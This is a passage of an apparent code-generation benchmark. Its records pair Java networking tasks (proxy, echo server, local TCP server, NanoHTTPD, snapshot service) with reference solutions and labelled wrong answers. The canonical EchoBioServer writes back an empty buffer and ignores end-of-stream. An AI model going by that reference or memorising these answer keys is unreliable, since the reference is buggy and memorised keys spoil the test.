injectCustomHeaders(connection, url);\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            int code = connection.getResponseCode();\n            redirected = code == HTTP_MOVED_PERM || code == HTTP_MOVED_TEMP || code == HTTP_SEE_OTHER;\n            if (redirected) {\n                url = connection.getHeaderField(\"Location\");\n                redirectCount++;\n                connection.disconnect();\n            }\n            if (redirectCount > MAX_REDIRECTS) {\n                throw new ProxyCacheException(\"Too many redirects: \" + redirectCount);\n            }\n        } while (redirected);\n        return connection;\n    }\n\n    private void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> extraHeaders = headerInjector.addHeaders(url);\n        for (Map.Entry<String, String> header : extraHeaders.entrySet()) {\n            connection.setRequestProperty(header.getKey(), header.getValue());\n        }\n    }\n\n    public synchronized String getMime() throws ProxyCacheException {\n        if (TextUtils.isEmpty(sourceInfo.mime)) {\n            fetchContentInfo();\n        }\n        return sourceInfo.mime;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUrlSource {\n    private SourceInfoStorage sourceInfoStorage;\n    private HeaderInjector headerInjector;\n    private SourceInfo sourceInfo;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n\n    public long length() {\n        if (sourceInfo == null) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getLength();\n    }\n\n    public void open(long offset) {\n        close();\n        connection = openConnection(offset, 10000);\n        try {\n            inputStream = connection.getInputStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public int read(byte[] buffer) {\n        try {\n            return inputStream.read(buffer);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return -1;\n        }\n    }\n\n    public String getMime() {\n        if (sourceInfo == null) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getMimeType();\n    }\n\n    public String getUrl() {\n        if (sourceInfo == null) {\n            fetchContentInfo();\n        }\n        return sourceInfo.getUrl();\n    }\n\n    public void fetchContentInfo() {\n        try {\n            connection = openConnection(0, 10000);\n            int responseCode = connection.getResponseCode();\n            String mimeType = connection.getContentType();\n            long contentLength = getContentLength(connection);\n            sourceInfo = new SourceInfo(sourceInfoStorage, connection.getURL().toString(), contentLength, mimeType);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public HttpURLConnection openConnection(long offset, int timeout) {\n        try {\n            URL url = new URL(sourceInfo.getUrl());\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(timeout);\n            connection.setReadTimeout(timeout);\n            connection.setRequestMethod(\"GET\");\n            if (offset > 0) {\n                connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n            }\n            injectCustomHeaders(connection, sourceInfo.getUrl());\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 300 && responseCode < 400) {\n                String location = connection.getHeaderField(\"Location\");\n                if (location != null) {\n                    connection = openConnection(offset, timeout);\n                }\n            }\n            return connection;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void injectCustomHeaders(HttpURLConnection connection, String url) {\n        Map<String, String> headers = headerInjector.getHeaders(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    public long readSourceAvailableBytes(HttpURLConnection connection, long offset, int responseCode) {\n        if (responseCode == 206) {\n            String contentRange = connection.getHeaderField(\"Content-Range\");\n            if (contentRange != null) {\n                String[] parts = contentRange.split(\"/\");\n                if (parts.length == 2) {\n                    String range = parts[0].substring(6);\n                    String[] rangeParts = range.split(\"-\");\n                    if (rangeParts.length == 2) {\n                        long start = Long.parseLong(rangeParts[0]);\n                        long end = Long.parseLong(rangeParts[1]);\n                        return end - start + 1;\n                    }\n                }\n            }\n        } else if (responseCode == 200) {\n            return getContentLength(connection);\n        }\n        return -1;\n    }\n\n    public long getContentLength(HttpURLConnection connection) {\n        String contentLength = connection.getHeaderField(\"Content-Length\");\n        if (contentLength != null) {\n            return Long.parseLong(contentLength);\n        }\n        return -1;\n    }\n}"
  },
  {
    "Task_id": 540,
    "Instruction": "Task Description: Implement a TCP proxy server class that can forward traffic between a client and a remote server, with the ability to start, stop, and manage connections dynamically.\n\nClass Description: The ConnectionManipulationProxyServer class acts as a TCP proxy that listens on a local port, accepts client connections, and forwards traffic to a specified remote host and port. It provides thread-safe control over the proxy's operation and proper resource cleanup.\n\nAttributes:\n- localPort: [int] - The local port on which the proxy listens for client connections\n- host: [String] - The remote host address to which traffic will be forwarded\n- remotePort: [int] - The remote port to which traffic will be forwarded\n- proxyThread: [Thread] - The thread running the proxy operation\n- enableLock: [Object] - Synchronization lock for thread-safe operation control\n- enableProxy: [boolean] - Flag indicating whether the proxy is currently enabled\n- running: [boolean] - Flag indicating whether the proxy thread should continue running\n- client: [Socket] - The client-side socket connection\n- server: [Socket] - The server-side socket connection\n- serverSocket: [ServerSocket] - The server socket listening for client connections\n\nMethods:\n- ConnectionManipulationProxyServer([String host, int remotePort, int localPort]) -> [void] - Constructor that initializes the proxy with target host and port information\n- startProxy() -> [void] - Starts the proxy server thread and enables traffic forwarding\n- stopProxy() -> [void] - Stops the proxy server thread and disables traffic forwarding\n- killOpenSockets() -> [void] - Closes all open sockets and cleans up resources\n- run() -> [void] - Main proxy thread execution method that handles connection setup and data forwarding\n- getLocalPort() -> [int] - Returns the local port on which the proxy is listening",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Logger;\n\npublic class ConnectionManipulationProxyServer implements Runnable {\n    private static final Logger log = Logger.getLogger(ConnectionManipulationProxyServer.class.getName());\n    private int localPort;\n    private String host;\n    private int remotePort;\n    private Thread proxyThread;\n    private final Object enableLock = new Object();\n    private boolean enableProxy = true;\n    private boolean running = true;\n    private Socket client = null;\n    private Socket server = null;\n    private ServerSocket serverSocket = null;\n\n    public ConnectionManipulationProxyServer(String host, int remotePort, int localPort) {\n        this.localPort = localPort;\n        this.remotePort = remotePort;\n        this.host = host;\n        this.proxyThread = new Thread(this);\n    }\n\n    public void startProxy() {\n        log.info(\"[CMPS Proxy] - Starting Proxy\");\n        synchronized (enableLock) {\n            enableProxy = true;\n        }\n        running = true;\n        proxyThread.start();\n    }\n\n    public void stopProxy() {\n        log.info(\"[CMPS Proxy] - Stopping Proxy\");\n        synchronized (enableLock) {\n            enableProxy = false;\n        }\n        running = false;\n        killOpenSockets();\n    }\n\n    private void killOpenSockets() {\n        log.info(\"[CMPS Proxy] - killOpenSockets Called.\");\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n            if (client != null) {\n                client.close();\n            }\n            if (server != null) {\n                server.close();\n            }\n        } catch (IOException ex) {\n            // Ignore during cleanup\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(\"[CMPS Proxy] - Proxy Thread running.\");\n        try {\n            final byte[] request = new byte[1024];\n            byte[] reply = new byte[4096];\n            \n            while (running) {\n                synchronized (enableLock) {\n                    if (!enableProxy) continue;\n                }\n\n                if (serverSocket == null || serverSocket.isClosed()) {\n                    serverSocket = new ServerSocket(localPort);\n                    localPort = serverSocket.getLocalPort();\n                }\n\n                log.info(\"[CMPS Proxy] - Waiting for incoming connection..\");\n                \n                try {\n                    client = serverSocket.accept();\n                    log.info(\"[CMPS Proxy] - Client Opened Connection to Proxy...\");\n                    \n                    final InputStream streamFromClient = client.getInputStream();\n                    final OutputStream streamToClient = client.getOutputStream();\n                    \n                    server = new Socket(host, remotePort);\n                    log.info(\"Proxy: Proxy Connected to Server\");\n                    \n                    final InputStream streamFromServer = server.getInputStream();\n                    final OutputStream streamToServer = server.getOutputStream();\n                    \n                    Thread thread = new Thread() {\n                        public void run() {\n                            int bytesRead;\n                            try {\n                                while ((bytesRead = streamFromClient.read(request)) != -1) {\n                                    streamToServer.write(request, 0, bytesRead);\n                                    streamToServer.flush();\n                                }\n                            } catch (IOException ex) {\n                                log.warning(\"[CMPS Proxy] - IOException in client to server stream: \" + ex.getMessage());\n                                try {\n                                    client.close();\n                                    server.close();\n                                } catch (IOException e) {\n                                    // Ignore during cleanup\n                                }\n                            }\n                        }\n                    };\n                    thread.start();\n                    \n                    int bytesRead;\n                    try {\n                        while ((bytesRead = streamFromServer.read(reply)) != -1) {\n                            streamToClient.write(reply, 0, bytesRead);\n                            streamToClient.flush();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException in server to client stream: \" + ex.getMessage());\n                        client.close();\n                        server.close();\n                    }\n                    \n                    streamToClient.close();\n                    \n                } catch (IOException ex) {\n                    log.warning(\"[CMPS Proxy] - General IO Exception caught in main Thread: \" + ex.getMessage());\n                    break;\n                } finally {\n                    try {\n                        if (server != null) {\n                            server.close();\n                        }\n                        if (client != null) {\n                            client.close();\n                        }\n                    } catch (IOException ex) {\n                        log.warning(\"[CMPS Proxy] - IOException caught whilst closing proxy connection: \" + ex.getMessage());\n                    }\n                }\n            }\n            \n            if (!serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            log.info(\"[CMPS Proxy] - Server Socket Closed, returning...\");\n            \n        } catch (IOException ex) {\n            log.warning(\"[CMPS Proxy] - Thread Connection lost: \" + ex.getMessage());\n            ex.printStackTrace();\n        }\n    }\n\n    public int getLocalPort() {\n        return localPort;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```python\nimport socket\nimport threading\n\nclass ConnectionManipulationProxyServer:\n    def __init__(self, host, remotePort, localPort):\n        self.localPort = localPort\n        self.host = host\n        self.remotePort = remotePort\n        self.proxyThread = None\n        self.enableLock = threading.Lock()\n        self.enableProxy = False\n        self.running = False\n        self.client = None\n        self.server = None\n        self.serverSocket = None\n\n    def startProxy(self):\n        with self.enableLock:\n            if not self.enableProxy:\n                self.enableProxy = True\n                self.running = True\n                self.proxyThread = threading.Thread(target=self.run)\n                self.proxyThread.start()\n\n    def stopProxy(self):\n        with self.enableLock:\n            if self.enableProxy:\n                self.enableProxy = False\n                self.running = False\n                self.killOpenSockets()\n\n    def killOpenSockets(self):\n        if self.client:\n            try:\n                self.client.close()\n            except:\n                pass\n            self.client = None\n        if self.server:\n            try:\n                self.server.close()\n            except:\n                pass\n            self.server = None\n        if self.serverSocket:\n            try:\n                self.serverSocket.close()\n            except:\n                pass\n            self.serverSocket = None\n\n    def run(self):\n        self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.serverSocket.bind(('127.0.0.1', self.localPort))\n        self.serverSocket.listen(5)\n        while self.running:\n            try:\n                self.client, addr = self.serverSocket.accept()\n                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.server.connect((self.host, self.remotePort))\n                threading.Thread(target=self.forward, args=(self.client, self.server)).start()\n                threading.Thread(target=self.forward, args=(self.server, self.client)).start()\n            except:\n                break\n        self.killOpenSockets()\n\n    def forward(self, source, destination):\n        while self.running and self.enableProxy:\n            try:\n                data = source.recv(4096)\n                if not data:\n                    break\n                destination.sendall(data)\n            except:\n                break\n        try:\n            source.close()\n        except:\n            pass\n        try:\n            destination.close()\n        except:\n            pass\n\n    def getLocalPort(self):\n        return self.localPort\n```"
  },
  {
    "Task_id": 541,
    "Instruction": "Task Description: Implement a TCP server in Java that handles multiple client connections concurrently using blocking I/O. The server should echo back any data received from clients after sending an initial welcome message.\n\nClass Description: EchoBioServer is a TCP server implementation that listens for incoming client connections on a specified port. For each connection, it creates a new thread to handle communication, sending a welcome message initially and then echoing back all received data.\n\nAttributes:\n- FIRST_BYTES: byte[] - The welcome message to be sent to clients upon connection\n- serverSocket: ServerSocket - The server socket listening for incoming connections\n\nMethods:\n- EchoBioServer(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Main server loop that accepts incoming connections and spawns new threads for each client\n- BioConnection(Socket socket) -> void - Nested class constructor that handles individual client connections\n- run() -> void - (In BioConnection) Handles the communication with a single client, echoing received data\n\nNested Class: BioConnection\nAttributes:\n- socket: Socket - The client socket connection\n- input: InputStream - Input stream for reading client data\n- output: OutputStream - Output stream for writing to client\n- readBuffer: byte[] - Buffer for storing received data\n- writeBuffer: byte[] - Buffer for storing data to send\n\nMethods:\n- BioConnection(Socket socket) -> void - Constructor that initializes I/O streams and buffers for a client connection\n- run() -> void - Handles the client communication loop (send welcome message, echo received data)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoBioServer implements Runnable {\n\n    private static final byte[] FIRST_BYTES = \"Welcome to Cobar Server.\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                new Thread(new BioConnection(socket)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer;\n        private byte[] writeBuffer;\n\n        private BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            this.input = socket.getInputStream();\n            this.output = socket.getOutputStream();\n            this.readBuffer = new byte[4096];\n            this.writeBuffer = new byte[4096];\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n                while (true) {\n                    int got = input.read(readBuffer);\n                    output.write(writeBuffer, 0, got);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                if (socket != null) {\n                    try {\n                        socket.close();\n                    } catch (IOException e1) {\n                        e1.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EchoBioServer {\n    private static final byte[] FIRST_BYTES = \"Welcome to the Echo Server!\\n\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void run() throws IOException {\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new BioConnection(socket)).start();\n        }\n    }\n\n    private static class BioConnection implements Runnable {\n        private final Socket socket;\n        private final InputStream input;\n        private final OutputStream output;\n        private final byte[] readBuffer;\n        private final byte[] writeBuffer;\n\n        public BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            this.input = socket.getInputStream();\n            this.output = socket.getOutputStream();\n            this.readBuffer = new byte[1024];\n            this.writeBuffer = new byte[1024];\n        }\n\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n\n                int bytesRead;\n                while ((bytesRead = input.read(readBuffer)) != -1) {\n                    System.arraycopy(readBuffer, 0, writeBuffer, 0, bytesRead);\n                    output.write(writeBuffer, 0, bytesRead);\n                    output.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        int port = 8080;\n        EchoBioServer server = new EchoBioServer(port);\n        server.run();\n    }\n}"
  },
  {
    "Task_id": 542,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles incoming client connections, processes commands, and interacts with a GUI frame. The server should support checking for existing instances, activating windows, and processing file operations.\n\nClass Description: TcpServer is a Thread subclass that creates a TCP server listening on a specified port. It communicates with clients to perform actions like getting window titles, activating windows, and opening files in the associated GUI frame.\n\nAttributes:\n- frame: IAppFrame - Reference to the application's GUI frame for window operations\n- port: int - The port number on which the server listens\n- file: String - File path to be processed (optional)\n\nMethods:\n- TcpServer(int port, IAppFrame frame) -> None - Constructor initializing server with port and frame reference\n- TcpServer(int port, IAppFrame frame, String file) -> None - Constructor with additional file parameter\n- checkExistInstance(int port) -> boolean - Static method checking if another instance is running on given port\n- ask(String host, String cmd, int port) -> boolean - Private static helper method for sending commands to existing instances\n- run() -> None - Main server thread method that listens for connections and processes client requests",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.swing.JFrame;\nimport javax.swing.SwingUtilities;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public static String GETWINDOWTITLE = \"GetWindowTitle\";\n    public static String ACTIVATE = \"ACTIVATE\";\n    public static String LOCALHOST = \"127.0.0.1\";\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this(port, frame);\n        this.file = file;\n    }\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        return ask(LOCALHOST, GETWINDOWTITLE, port);\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        Socket s = new Socket();\n        try {\n            InetSocketAddress isa = new InetSocketAddress(host, port);\n            s.connect(isa, 2000);\n            OutputStream os = s.getOutputStream();\n            os.write(cmd.getBytes());\n            InputStream is = s.getInputStream();\n            byte[] buffer = new byte[1024];\n            int len = is.read(buffer);\n            String res = new String(buffer, 0, len);\n            return res != null && !res.isEmpty();\n        } catch (Exception x) {\n            return false;\n        } finally {\n            try {\n                s.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n\n    public void run() {\n        ServerSocket ss = null;\n        try {\n            ss = new ServerSocket(port, 10, InetAddress.getByName(LOCALHOST));\n            while (true) {\n                Socket s = ss.accept();\n                try {\n                    InputStream is = s.getInputStream();\n                    byte[] buffer = new byte[1024];\n                    int len = is.read(buffer);\n                    String file = new String(buffer, 0, len);\n                    \n                    if (file.equals(GETWINDOWTITLE)) {\n                        OutputStream os = s.getOutputStream();\n                        String wTitle = ((JFrame) frame).getTitle();\n                        os.write(wTitle.getBytes());\n                    } else if (file.equals(ACTIVATE)) {\n                        ((JFrame) frame).toFront();\n                    } else {\n                        if (file.startsWith(\"\\\"\")) {\n                            file = file.substring(1, file.length() - 1);\n                        }\n                        final String sfile = file;\n                        SwingUtilities.invokeLater(() -> {\n                            try {\n                                frame.openSheetFile(sfile);\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        });\n                    }\n                } finally {\n                    s.close();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (ss != null) {\n                try {\n                    ss.close();\n                } catch (IOException e) {\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this.port = port;\n        this.frame = frame;\n        this.file = file;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        try {\n            Socket socket = new Socket(\"localhost\", port);\n            socket.close();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        try {\n            Socket socket = new Socket(host, port);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            out.println(cmd);\n            String response = in.readLine();\n            socket.close();\n            return \"OK\".equals(response);\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    @Override\n    public void run() {\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            System.out.println(\"TCP Server is listening on port \" + port);\n            while (!isInterrupted()) {\n                Socket clientSocket = serverSocket.accept();\n                new ClientHandler(clientSocket).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket clientSocket;\n\n        public ClientHandler(Socket socket) {\n            this.clientSocket = socket;\n        }\n\n        @Override\n        public void run() {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                 PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {\n                String command = in.readLine();\n                if (command == null) return;\n                if (command.equals(\"GET_WINDOW_TITLES\")) {\n                    List<String> titles = frame.getWindowTitles();\n                    out.println(String.join(\"\\n\", titles));\n                } else if (command.startsWith(\"ACTIVATE_WINDOW \")) {\n                    String windowTitle = command.substring(\"ACTIVATE_WINDOW \".length());\n                    frame.activateWindow(windowTitle);\n                    out.println(\"OK\");\n                } else if (command.startsWith(\"OPEN_FILE \")) {\n                    String filePath = command.substring(\"OPEN_FILE \".length());\n                    frame.openFile(filePath);\n                    out.println(\"OK\");\n                } else if (command.equals(\"CHECK_EXIST_INSTANCE\")) {\n                    out.println(checkExistInstance(port) ? \"TRUE\" : \"FALSE\");\n                } else if (command.startsWith(\"ASK \")) {\n                    String[] parts = command.split(\" \", 3);\n                    if (parts.length == 3) {\n                        String host = parts[1];\n                        String cmd = parts[2];\n                        boolean result = ask(host, cmd, port);\n                        out.println(result ? \"TRUE\" : \"FALSE\");\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 544,
    "Instruction": "Task Description: Create a lightweight HTTP server class that can handle incoming client connections and process requests through abstract methods that must be implemented by subclasses.\n\nClass Description: NanoHTTPD is a minimal HTTP server implementation that listens for incoming TCP connections on a specified port, handles client connections by providing input/output streams, and requires subclasses to implement the actual request processing logic.\n\nAttributes:\n- hostname: String - The hostname or IP address to bind the server to (nullable)\n- myPort: int - The port number to listen on\n- myServerSocket: ServerSocket - The server socket instance for accepting connections\n- myThread: Thread - The main listener thread for the server\n\nMethods:\n- NanoHTTPD(int port) -> void - Constructor that initializes the server with just a port number (hostname defaults to null)\n- NanoHTTPD(String hostname, int port) -> void - Constructor that initializes the server with both hostname and port\n- start() -> void - Starts the server by creating a ServerSocket and launching a daemon thread to accept connections\n- stop() -> void - Stops the server by closing the ServerSocket and joining the listener thread\n- handleConnection(InputStream inputStream, OutputStream outputStream) -> abstract void - Abstract method that must be implemented by subclasses to handle the actual client connection processing",
    "Canonical_solution": "import android.util.Log;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic abstract class NanoHTTPD {\n    private final String hostname;\n    private final int myPort;\n    private ServerSocket myServerSocket;\n    private Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this(null, port);\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() throws IOException {\n        Log.i(\"NanoHTTPD\", \"server start\");\n        myServerSocket = new ServerSocket();\n        myServerSocket.bind((hostname != null) ? new InetSocketAddress(\n                hostname, myPort) : new InetSocketAddress(myPort));\n\n        myThread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                do {\n                    try {\n                        final Socket finalAccept = myServerSocket.accept();\n                        Log.i(\"NanoHTTPD\",\n                                \"accept request from \"\n                                        + finalAccept.getInetAddress());\n                        InputStream inputStream = finalAccept.getInputStream();\n                        OutputStream outputStream = finalAccept\n                                .getOutputStream();\n                        handleConnection(inputStream, outputStream);\n                        if (finalAccept != null) {\n                            finalAccept.close();\n                        }\n                    } catch (IOException e) {\n                    }\n                } while (!myServerSocket.isClosed());\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.setName(\"NanoHttpd Main Listener\");\n        myThread.start();\n    }\n\n    public void stop() {\n        Log.i(\"NanoHTTPD\", \"server stop\");\n        try {\n            myServerSocket.close();\n            myThread.join();\n        } catch (IOException ioe) {\n            ioe.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public abstract class NanoHTTPD {\n    protected String hostname;\n    protected int myPort;\n    protected ServerSocket myServerSocket;\n    protected Thread myThread;\n\n    public NanoHTTPD(int port) {\n        this.hostname = null;\n        this.myPort = port;\n    }\n\n    public NanoHTTPD(String hostname, int port) {\n        this.hostname = hostname;\n        this.myPort = port;\n    }\n\n    public void start() {\n        myThread = new Thread(() -> {\n            try {\n                myServerSocket = new ServerSocket(myPort, 0, hostname != null ? InetAddress.getByName(hostname) : null);\n                while (!myServerSocket.isClosed()) {\n                    Socket socket = myServerSocket.accept();\n                    InputStream inputStream = socket.getInputStream();\n                    OutputStream outputStream = socket.getOutputStream();\n                    handleConnection(inputStream, outputStream);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n        myThread.setDaemon(true);\n        myThread.start();\n    }\n\n    public void stop() {\n        try {\n            if (myServerSocket != null) {\n                myServerSocket.close();\n            }\n            if (myThread != null) {\n                myThread.join();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public abstract void handleConnection(InputStream inputStream, OutputStream outputStream);\n}"
  },
  {
    "Task_id": 547,
    "Instruction": "Task Description: Implement a TCP server class that listens for incoming client connections, processes client commands, and sends responses back. The server should run in a dedicated thread and support graceful shutdown.\n\nClass Description: SnapshotService is a TCP server implementation that listens on a specified port for client connections. It processes incoming commands from clients and responds with processed messages. The server runs in a separate thread and maintains its state through a boolean flag for controlled shutdown.\n\nAttributes:\n- port: [int] - The port number on which the server listens for incoming connections\n- serverSocket: [ServerSocket] - The server socket instance used to accept client connections\n- closed: [boolean] - Flag indicating whether the server has been shut down\n\nMethods:\n- SnapshotService(int port) -> [void] - Constructor that validates and sets the server port\n- listen() -> [void] - Starts the server by opening a socket and beginning to listen for connections\n- openSocket(int port) -> [int] - Creates a ServerSocket and starts a thread to handle client connections, returns the actual port being used\n- isIgnoredException() -> [boolean] - Checks if an exception should be ignored based on server socket state\n- process(Socket socket) -> [void] - Processes an individual client connection, reading input and sending responses\n- outputMessage(BufferedWriter outputWriter, String msg) -> [void] - Helper method to send messages to clients\n- close() -> [void] - Gracefully shuts down the server by closing the server socket",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport lombok.extern.slf4j.Slf4j;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\n@Slf4j\npublic final class SnapshotService {\n\n    private final int port;\n    private ServerSocket serverSocket;\n    private volatile boolean closed;\n\n    public SnapshotService(final int port) {\n        Preconditions.checkArgument(port >= 0 && port <= 0xFFFF, \"Port value out of range: \" + port);\n        this.port = port;\n    }\n\n    public void listen() {\n        try {\n            log.info(\"ElasticJob: Snapshot service is running on port '{}'\", openSocket(port));\n        } catch (final IOException ex) {\n            log.error(\"ElasticJob: Snapshot service listen failure, error is: \", ex);\n        }\n    }\n\n    private int openSocket(final int port) throws IOException {\n        closed = false;\n        serverSocket = new ServerSocket(port);\n        int localPort = serverSocket.getLocalPort();\n        String threadName = String.format(\"elasticjob-snapshot-service-%d\", localPort);\n        new Thread(() -> {\n            while (!closed) {\n                try {\n                    process(serverSocket.accept());\n                } catch (final IOException ex) {\n                    if (isIgnoredException()) {\n                        return;\n                    }\n                    log.error(\"ElasticJob: Snapshot service open socket failure, error is: \", ex);\n                }\n            }\n        }, threadName).start();\n        return localPort;\n    }\n\n    private boolean isIgnoredException() {\n        return serverSocket.isClosed();\n    }\n\n    private void process(final Socket socket) throws IOException {\n        try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n                Socket ignored = socket) {\n            String cmdLine = reader.readLine();\n            if (null != cmdLine) {\n                outputMessage(writer, \"Processed: \" + cmdLine);\n            }\n        }\n    }\n\n    private void outputMessage(final BufferedWriter outputWriter, final String msg) throws IOException {\n        outputWriter.append(msg);\n        outputWriter.flush();\n    }\n\n    public void close() {\n        closed = true;\n        if (null != serverSocket && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (final IOException ex) {\n                log.error(\"ElasticJob: Snapshot service close failure, error is: \", ex);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
